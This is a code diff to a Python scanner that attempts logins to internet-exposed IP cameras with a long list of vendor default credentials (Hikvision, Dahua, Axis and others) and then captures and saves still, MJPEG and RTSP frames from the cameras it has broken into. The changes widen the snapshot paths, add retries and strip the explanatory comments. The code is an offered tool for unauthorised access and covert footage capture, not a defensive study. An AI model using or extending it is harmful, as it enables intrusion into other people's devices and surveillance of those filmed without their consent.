@@ -25,7 +25,7 @@ os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
 discovered = []
 
 DEFAULT_CREDS = [
-    None,  # Try no auth first :3
+    None, 
     ('admin', 'admin'),
     ('admin', ''),
     ('admin', 'password'),
@@ -53,27 +53,26 @@ DEFAULT_CREDS = [
     ('admin1', 'admin1'),
     ('administrator', 'administrator'),
     ('administrator', 'admin'),
-    ('ubnt', 'ubnt'),  # Ubiquiti
+    ('ubnt', 'ubnt'), 
     ('service', 'service'),
     ('support', 'support'),
     ('user', 'user'),
     ('guest', 'guest'),
     ('default', 'default'),
     ('system', 'system'),
-    # Camera brand defaults
-    ('admin', '9999'),  # Multiple brands
-    ('admin', '123456789'),  # Multiple brands
+    ('admin', '9999'), 
+    ('admin', '123456789'), 
     ('hikvision', 'hikvision'),
     ('admin', 'hikvision'),
-    ('admin', '12345678a'),  # Hikvision
+    ('admin', '12345678a'), 
     ('dahua', 'dahua'),
     ('admin', 'dahua'),
-    ('admin', '888888'),  # Dahua
+    ('admin', '888888'), 
     ('axis', 'axis'),
-    ('root', 'pass'),  # Axis
-    ('viewer', 'viewer'),  # Axis
-    ('admin', 'meinsm'),  # Axis
-    ('admin', '4321'),  # Axis
+    ('root', 'pass'), 
+    ('viewer', 'viewer'), 
+    ('admin', 'meinsm'), 
+    ('admin', '4321'), 
     ('foscam', 'foscam'),
     ('admin', 'foscam'),
     ('amcrest', 'amcrest'),
@@ -84,19 +83,19 @@ DEFAULT_CREDS = [
     ('admin', 'lorex'),
     ('swann', 'swann'),
     ('admin', 'swann'),
-    ('admin', 'tlJwpbo6'),  # Hikvision
-    ('admin', 'Hikvision2020'),  # Hikvision
-    ('admin', 'HikAdmin2020'),  # Hikvision
-    ('admin', 'hik12345'),  # Hikvision
-    ('admin', 'hikadmin'),  # Hikvision
-    ('admin', 'dahua2020'),  # Dahua
-    ('admin', 'DahuaAdmin'),  # Dahua
-    ('admin', 'dh12345'),  # Dahua
-    ('admin', 'dahuaadmin'),  # Dahua
-    ('admin', 'axis2020'),  # Axis
-    ('admin', 'AxisAdmin'),  # Axis
-    ('admin', 'ax12345'),  # Axis
-    ('admin', 'axisadmin'),  # Axis
+    ('admin', 'tlJwpbo6'), 
+    ('admin', 'Hikvision2020'), 
+    ('admin', 'HikAdmin2020'), 
+    ('admin', 'hik12345'), 
+    ('admin', 'hikadmin'), 
+    ('admin', 'dahua2020'), 
+    ('admin', 'DahuaAdmin'), 
+    ('admin', 'dh12345'), 
+    ('admin', 'dahuaadmin'), 
+    ('admin', 'axis2020'), 
+    ('admin', 'AxisAdmin'), 
+    ('admin', 'ax12345'), 
+    ('admin', 'axisadmin'), 
 ]
 
 CAMERA_SIGS = [
@@ -146,27 +145,94 @@ def capture_camera_image(url, auth=None):
             url = f'http://{url}'
             
         paths = [
-            '/video.cgi', '/image.jpg', '/snap.jpg', '/snapshot.cgi', '/capture.jpg',
-            '/live.jpg', '/mjpg/video.mjpg', '/axis-cgi/jpg/image.cgi',
-            '/cgi-bin/snapshot.cgi', '/webcapture.jpg', '/live/1/jpeg.jpg',
-            '/onvif-http/snapshot', '/cgi-bin/camera.cgi', '/videostream.cgi',
-            '/img/snapshot.cgi', '/live/ch0'
+            '/Streaming/channels/1/picture',
+            '/cgi-bin/snapshot.cgi',
+            '/snap.jpg',
+            '/snapshot.jpg',
+            '/image.jpg',
+            '/video.cgi',
+            '/image/jpeg.cgi',
+            '/mjpg/video.mjpg',
+            '/cgi-bin/video.jpg',
+            '/live.jpg',
+            '/onvif-http/snapshot',
+            '/axis-cgi/jpg/image.cgi',
+            '/webcapture.jpg?command=snap',
+            '/media/video1/jpeg',
+            '/live/ch0',
+            '/live/stream',
+            '/live/1/jpeg.jpg',
+            '/live_stream',
+            '/image1',
+            '/video1',
+            '/cam/realmonitor',
+            '/videostream.cgi',
+            '/img/snapshot.cgi',
+            '/cgi-bin/camera.cgi',
+            '/jpeg',
+            '/picture',
+            '/image',
+            '/still',
+            '/capture',
+            '/frame',
         ]
         
         for path in paths:
             try:
                 img_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
-                r = requests.get(img_url, timeout=1, verify=False, auth=auth)
-                if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
-                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-                    filename = f"{SCREENSHOTS_DIR}/{timestamp}_{url.replace('://', '_').replace('/', '_')}.jpg"
-                    with open(filename, 'wb') as f:
-                        f.write(r.content)
-                    print(f"Captured image from {img_url} -> {filename}")
-                    return True
+                r = requests.get(img_url, timeout=2, verify=False, auth=auth, 
+                               headers={'Accept': 'image/jpeg,image/png,image/*'})
+                
+                content_type = r.headers.get('Content-Type', '').lower()
+                if r.status_code == 200 and ('image' in content_type or 'video' in content_type or len(r.content) > 1000):
+                    try:
+                        img = Image.open(io.BytesIO(r.content))
+                        if img.size[0] < 32 or img.size[1] < 32:
+                            continue
+                            
+                        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+                        safe_url = url.replace('://', '_').replace('/', '_').replace(':', '_')
+                        filename = f"{SCREENSHOTS_DIR}/{timestamp}_{safe_url}.jpg"
+                        
+                        if img.mode != 'RGB':
+                            img = img.convert('RGB')
+                        img.save(filename, 'JPEG', quality=95)
+                        
+                        print(f"✓ Captured image from {img_url} -> {filename}")
+                        return True
+                    except:
+                        continue
             except:
                 continue
                 
+        try:
+            mjpeg_paths = ['/video.mjpg', '/mjpg/video.mjpg', '/videostream.mjpg']
+            for path in mjpeg_paths:
+                try:
+                    mjpeg_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
+                    r = requests.get(mjpeg_url, timeout=2, verify=False, auth=auth, stream=True)
+                    if r.status_code == 200 and 'multipart' in r.headers.get('Content-Type', '').lower():
+                        boundary = r.headers['Content-Type'].split('boundary=')[1]
+                        content = b''
+                        for chunk in r.iter_content(chunk_size=1024):
+                            content += chunk
+                            if b'\r\n\r\n' in content:
+                                frame = content.split(b'\r\n\r\n')[1].split(boundary.encode())[0]
+                                try:
+                                    img = Image.open(io.BytesIO(frame))
+                                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+                                    safe_url = url.replace('://', '_').replace('/', '_').replace(':', '_')
+                                    filename = f"{SCREENSHOTS_DIR}/{timestamp}_{safe_url}_mjpeg.jpg"
+                                    img.save(filename, 'JPEG', quality=95)
+                                    print(f"✓ Captured MJPEG frame from {mjpeg_url} -> {filename}")
+                                    return True
+                                except:
+                                    break
+                except:
+                    continue
+        except:
+            pass
+            
         return False
     except:
         return False
@@ -177,17 +243,29 @@ def capture_rtsp(url):
         if not cap.isOpened():
             return False
             
-        ret, frame = cap.read()
-        if not ret:
-            return False
+        max_tries = 5
+        frame = None
+        for i in range(max_tries):
+            ret, frame = cap.read()
+            if ret and frame is not None and frame.size > 0:
+                break
+            time.sleep(0.1)
             
-        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        filename = f"{SCREENSHOTS_DIR}/{timestamp}_{url.replace('://', '_').replace('/', '_')}.jpg"
-        cv2.imwrite(filename, frame)
-        print(f"Captured RTSP frame from {url} -> {filename}")
-        
         cap.release()
-        return True
+        
+        if frame is not None and frame.size > 0:
+            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+            safe_url = url.replace('://', '_').replace('/', '_').replace(':', '_')
+            filename = f"{SCREENSHOTS_DIR}/{timestamp}_{safe_url}_rtsp.jpg"
+            
+            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+            img = Image.fromarray(frame_rgb)
+            img.save(filename, 'JPEG', quality=95)
+            
+            print(f"✓ Captured RTSP frame from {url} -> {filename}")
+            return True
+            
+        return False
     except:
         return False
 
@@ -294,7 +372,6 @@ def try_default_creds(url):
             r = requests.get(url, auth=creds, timeout=TIMEOUT, verify=False)
             if r.status_code == 200:
                 save_camera(url, f"Auth success with {creds[0]}:{creds[1]}")
-                # Try to capture authenticated screenshot
                 capture_camera_image(url, auth=creds)
                 return True
         except:
